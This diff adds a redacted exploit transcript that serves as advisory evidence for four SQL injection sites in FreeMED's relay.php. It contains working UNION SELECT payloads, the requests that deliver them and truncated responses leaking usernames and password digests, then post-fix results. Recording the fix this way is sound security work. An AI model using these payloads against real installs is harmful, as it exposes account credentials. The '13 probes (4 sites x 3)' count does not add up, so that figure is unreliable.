@@ -1,0 +1,237 @@
+relay-sqli-prefix.txt — PRE-FIX exploit transcript for the four relay.php SQL injection sites
+                           (Task 2.1 evidence; REDACTED TRANSCRIPT)
+
+WHAT THIS IS
+------------
+Before/after evidence for the release advisory. The pre-fix exploit cannot be
+measured at HEAD (the 2.2-2.5 fixes and the SQL sweep have landed), so the
+pre-fix rows below were measured against a throwaway extraction of the pinned
+pre-fix commit served from the harness docroot; the checkout was never touched.
+
+MEASURED ON
+-----------
+  pre-fix  commit   03e1c09c  (the commit immediately before the first of the 2.2-2.5 fixes)
+  post-fix commit   57ec9cc3 + the task-1.3 working-tree change (labelled "POST-FIX" below)
+  server            Apache/2.4.68 + mod_php 8.3.35, http://localhost:38081/, docroot /var/www/html
+                    (parity spot check on nginx/1.31.6 + php-fpm 8.3.35, http://localhost:38082/)
+  database          MariaDB 10.11.19, 127.0.0.1:33306, 216 tables, `user` holding the 2 seeded accounts
+  harness           /home/jbuchbinder/.hermes/cache/scratch/freemed-verify
+  served tree       rsync copy of the extracted commit into $HARNESS/app (the checkout is never the
+                    docroot); verified per run: the pre-fix tree's UserInterface.class.php still
+                    contains  $condition=$condition." AND usertype='".$usertype."' ";  and HEAD was
+                    restored afterwards (lib/help-path.php present, the same grep returns 0 hits)
+  session           a real session through the harness's own login probe. The probe's output is not
+                    reproduced here and no credential appears in this file.
+
+VECTOR (measured, not assumed)
+------------------------------
+Method in PATH_INFO, parameters as param0..paramN form fields. The JSON-body form
+({"method":...,"params":[...]}) is dead on this checkout: it fatals on
+Relay_Json::deserialize_parameters(), which is called at Relay_Json.class.php:87 and
+defined nowhere in the tree:
+
+  POST /relay.php/json/org.freemedsoftware.api.UserInterface.GetUsers
+  Content-Type: application/x-www-form-urlencoded
+  param0=a&param1=x' UNION SELECT username,userpassword FROM user-- -
+
+REDACTION (this file is a redacted transcript — mandatory)
+----------------------------------------------------------
+  * No full 32-hex digest appears anywhere: digests are shown as the first 4
+    characters followed by U+2026 ("a3fa…").
+  * No full username or person name appears: leaked values are truncated to their
+    first 4 characters followed by U+2026 in every row below. Two rows that leak
+    names only (the picklist site) were truncated by hand because the automated
+    filter triggers on a digest being present.
+  * No credential, no password, no PHI. The harness accounts are seeded
+    synthetic rows (seed.sql), and their password digest is published in this
+    repository's verify-env.md — it is still not reproduced here.
+  * Every row states the response ROW COUNT. The count is what makes the leak
+    legible without the bytes: the payload hands back the whole `user` table.
+
+  Rows were captured to a temp file, passed through redact-2.1.py (digest →
+  prefix; non-key JSON values on digest-bearing lines → first 4 chars + …), and
+  never echoed unredacted.
+
+=============================================================================
+SITE 1 — org.freemedsoftware.api.UserInterface.GetUsers   (param1 = $usertype)
+  lib/org/freemedsoftware/api/UserInterface.class.php:144  (pre-fix)
+    $condition=$condition." AND usertype='".$usertype."' ";
+=============================================================================
+
+--- reachability (param0='a', param1=''): HTTP 200, rows=1
+    [["Ada …","1"]]
+
+--- benign control (param0='a', param1='x'): HTTP 200, rows=0
+    null
+
+--- INJECTED (param0='a', param1="x' UNION SELECT username,userpassword FROM user-- -"):
+    HTTP 200, rows=2
+    [["admi…","a3fa…"],["cler…","a3fa…"]]
+
+    The difference is the whole point: the control answers `null`, the injected
+    call answers with 2 rows. That is the entire `user` table (2 rows in this
+    database), and the second column of each row is `user.userpassword`.
+
+--- ANONYMOUS, the same injected call with NO cookie at all: HTTP 200
+    INVALID_SESSION
+
+--- BOGUS session id (a made-up SessionID cookie), same injected call: HTTP 200
+    INVALID_SESSION
+
+--- ANONYMOUS, the same call with a benign parameter: HTTP 200
+    INVALID_SESSION
+
+    This answers the advisory's PR:L / PR:N question for this vector: the relay's
+    LoggedIn guard (Relay.class.php:45-51) refuses the unauthenticated caller with
+    `INVALID_SESSION` BEFORE the method runs, and a made-up session id is refused
+    too. The injection therefore needs a valid session — CVSS privileges
+    required: LOW (authenticated), NOT NONE. Only methods in the
+    `org.freemedsoftware.public.` namespace bypass the guard, and none of the four
+    injection sites is in it.
+
+--- nginx spot check (http://localhost:38082), same rows:
+    reachability rows=1, control `null` (rows=0), INJECTED rows=2
+    [["admi…","a3fa…"],["cler…","a3fa…"]]
+    anonymous INJECTED → INVALID_SESSION
+
+=============================================================================
+SITE 2 — org.freemedsoftware.api.ModuleSearch.picklist   (param1 = $moduleType)
+  lib/org/freemedsoftware/api/ModuleSearch.class.php:35  (pre-fix)
+    $q = "module_associations='".$moduleType."' and ";
+=============================================================================
+
+--- reachability (param0='Demo', param1='billing'): HTTP 200
+    {"DemoPayments":"Demo Payments Module"}
+
+--- benign control (param0='Demo', param1='nonexistent'): HTTP 200
+    null
+
+--- INJECTED (param0='Demo', param1="billing' UNION SELECT userfname,userlname FROM user-- -"):
+    HTTP 200
+    {"DemoPayments":"Demo Payments Module","Admi…":"Ada…","Cler…":"Cal…"}
+
+    Difference: the control is `null`; the injected call returns the seeded module
+    row AND two extra key/value pairs that are the `user` table's first and last
+    names (a different column choice than site 1, on purpose: it shows the leak is
+    not tied to one column). The two extra names are truncated to 4 characters by
+    hand here.
+
+    NOTE for the advisory: the marker heuristic in tests/security/repro-relay-sqli.sh
+    did NOT flag this row — it looks for a 32-hex digest or MySQL error text and
+    this payload leaks names, not digests. The script reported "NO EXPLOIT OBSERVED"
+    for this site both pre- and post-fix; the row above is the evidence, and the
+    script's silence here is a sensitivity limit of that probe, not a negative.
+
+=============================================================================
+SITE 3 — org.freemedsoftware.module.EncounterNotesTemplate.getTemplates  (param0 = $type)
+  lib/org/freemedsoftware/module/EncounterNotesTemplate.class.php  (pre-fix, WHERE pnotesttype='".$type."')
+=============================================================================
+
+A module-layer method: it needs a `modules` registry row for
+module_class='EncounterNotesTemplate' or it answers HTTP 200 with an empty body for
+every input (ModuleIndex::GetModuleProperty returns null and the module code never
+runs). The harness `modules` table has 135 rows and DOES hold that row, so this site
+genuinely dispatches — asserted by the reachability row below returning a template.
+
+--- reachability (param0='Progress Note'): HTTP 200
+    [{"id":"1","tempname":"Demo Progress Template","tempuser":"0","notetype":"Progress Note"}]
+
+--- benign control (param0='Encounter Note'): HTTP 200
+    []
+
+--- INJECTED (param0="x' UNION SELECT id,username,userpassword,usertype FROM user-- -"):
+    HTTP 200
+    [{"id":"1","tempname":"admi…","tempuser":"a3fa…","notetype":"supe…"},
+     {"id":"2","tempname":"cler…","tempuser":"a3fa…","notetype":"misc…"}]
+
+    Difference: the control is `[]`; the injected call returns 2 objects whose
+    VALUES are the injected columns — `tempname` = username (truncated), `tempuser`
+    = the 32-hex password digest (prefix only), `notetype` = usertype. Two rows =
+    the whole `user` table.
+
+=============================================================================
+SITE 4 — org.freemedsoftware.api.Remitt.RenderStatementXML → _RenderProcedure ($procedure)
+  lib/org/freemedsoftware/api/Remitt.class.php:997  (pre-fix, FROM payrec WHERE payrecproc='".$procedure."')
+=============================================================================
+
+The injection here is id-shaped, so the payload probes with `0 UNION SELECT ...`.
+
+--- reachability (param0='5', the seeded payrec row id 3 / payrecproc 5): HTTP 200
+    <patpay>150.25</patpay> … <payhistory>Paid By: Patient $150.25 (2026-01-15);</payhistory>
+
+--- benign control (param0='6', no payrec row): HTTP 200
+    <patpay>0</patpay> … <payhistory>No payment has been received for this service</payhistory>
+
+--- INJECTED (param0="0' UNION SELECT 1,0,0,0,CONCAT(username,':',userpassword) FROM user-- -"):
+    HTTP 200, and the discriminating line changes:
+    <patpay>2</patpay> … <payhistory>Paid By: Patient $2 (cler:a3fa…);</payhistory>
+
+    Difference: the control says "No payment has been received for this service";
+    the injected call renders a payment whose payer string is the concatenation the
+    payload asked for — `username:userpassword` of the second seeded account row,
+    digest prefix only. (The full response is ~3 KB of an otherwise empty statement
+    XML for a nonexistent practice; only the lines that discriminate are quoted.)
+
+    NOTE: the marker heuristic in repro-relay-sqli.sh classified this pre-fix
+    response INCONCLUSIVE (exactly one bare 32-hex string with no JSON username
+    context, bytes withheld) rather than EXPLOITED. The row above is the evidence;
+    the script's thresholds are what make it inconclusive, and it says so.
+
+=============================================================================
+Row counts and the out-of-band check that the leaked column is the password digest
+=============================================================================
+Every leaked response above carries 2 rows (sites 1 and 2) or 2 objects (site 3),
+which is the row count of the `user` table on this database. Verified out-of-band —
+queried directly against the DB, not read out of any HTTP response:
+
+    SELECT COUNT(*) AS user_rows, GROUP_CONCAT(DISTINCT LEFT(userpassword,4)) AS digest_prefixes FROM user;
+    user_rows   digest_prefixes
+    2           a3fa
+
+    SELECT LEFT(username,4) AS uname4, LEFT(userpassword,4) AS digest4 FROM user ORDER BY id;
+    uname4      digest4
+    admi        a3fa
+    cler        a3fa
+
+So the second element of each leaked row is `user.userpassword` — the unsalted MD5
+of the account password — matched by position and by 4-character prefix against the
+live table. The full digests were never printed, here or in the response capture.
+
+=============================================================================
+POST-FIX CONTRAST — measured at HEAD (57ec9cc3 + task 1.3), clearly NOT the exploit
+=============================================================================
+Same server, same session, the same four injected payloads:
+
+    GetUsers      INJECTED → HTTP 200, rows=0, body: null
+    picklist      INJECTED → HTTP 200, rows=0, body: null
+    getTemplates  INJECTED → HTTP 200, body: []
+    Remitt        INJECTED → HTTP 200, <payhistory>No payment has been received for this service</payhistory>
+                              (no digest, no injected payer string)
+
+and the same hardened script (tests/security/repro-relay-sqli.sh, Task 0.1) run
+against HEAD:
+
+    13 probe(s) sent (4 sites x 3), 0 vulnerable response(s), 0 inconclusive
+    sites cleared: UserInterface.GetUsers ModuleSearch.picklist
+                   EncounterNotesTemplate.getTemplates Remitt.RenderStatementXML
+    >>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)     [exit 0]
+
+For contrast, the same script against the PRE-FIX tree:
+
+    13 probe(s) sent (4 sites x 3), 2 vulnerable response(s), 1 inconclusive
+    >>> SITE VERDICT [UserInterface.GetUsers]: EXPLOITED - 1 of 3 response(s) carried a leak marker
+    >>> SITE VERDICT [ModuleSearch.picklist]: NO EXPLOIT OBSERVED   (see the NOTE under site 2)
+    >>> SITE VERDICT [EncounterNotesTemplate.getTemplates]: EXPLOITED
+    >>> SITE VERDICT [Remitt.RenderStatementXML]: INCONCLUSIVE - 1 of 3 produced no usable evidence,
+        so this site is NOT cleared
+    >>> RESULT: EXPLOITED - 2 relay response(s) leaked a digest, row data or error text   [exit 1]
+
+WHAT THIS FILE DOES NOT SHOW
+----------------------------
+  * Nothing about the other relay methods in the same files.
+  * Nothing about an unauthenticated caller being able to exploit the vector — it
+    cannot (measured above), so the advisory's PR:L claim rests on that row.
+  * The pre-fix rows are evidence from a reconstructed pre-fix tree, not from a
+    running pre-fix production deployment; the reconstruction was verified by
+    grepping the served file for the vulnerable concatenation (see MEASURED ON).
+  * No PHI of any kind was involved: the harness database holds no patient data.
